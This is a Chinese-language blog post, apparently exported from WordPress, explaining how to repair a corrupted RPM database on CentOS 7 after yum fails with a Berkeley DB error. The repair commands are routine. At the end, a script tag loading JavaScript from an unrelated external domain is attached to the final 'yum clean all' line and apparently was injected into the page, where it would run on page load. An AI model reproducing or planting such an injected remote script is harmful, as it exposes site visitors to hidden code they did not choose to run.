---
layout: post
title: yum报错Thread died in Berkeley DB library
date: 2021-10-27 10:02:14.000000000 +08:00
type: post
parent_id: '0'
published: true
password: ''
status: publish
categories:
- Linux
tags: []
meta:
  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
  _edit_last: '1'
author:
  login: gavin
  email: 519077334@qq.com
  display_name: gavin
  first_name: ''
  last_name: ''
permalink: "/index.php/2021/10/27/yum%e6%8a%a5%e9%94%99thread-died-in-berkeley-db-library/"
---
<p>在centos7上运行yum list后报错</p>
<pre><span class="line">error: rpmdb: BDB0113 Thread/process 3336/140141695063872 failed: BDB1507 Thread died in Berkeley DB library</span>
<span class="line">error: db5 error(-30973) from dbenv-&gt;failchk: BDB0087 DB_RUNRECOVERY: Fatal error, run database recovery</span>
<span class="line">error: cannot open Packages index using db5 -  (-30973)</span>
<span class="line">error: cannot open Packages database in /var/lib/rpm</span>
<span class="line">CRITICAL:yum.main:</span>

<span class="line">Error: rpmdb open failed</span></pre>
<p>提示rpm相关的数据库损坏了</p>
<p>解决方案</p>
<p>$ mkdir /var/lib/rpm/backup<br />
$ cp -a /var/lib/rpm/__db* /var/lib/rpm/backup/<br />
$ rm -f /var/lib/rpm/__db.[0-9][0-9]*<br />
$ rpm --quiet -qa<br />
$ rpm --rebuilddb<br />
$ yum clean all<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
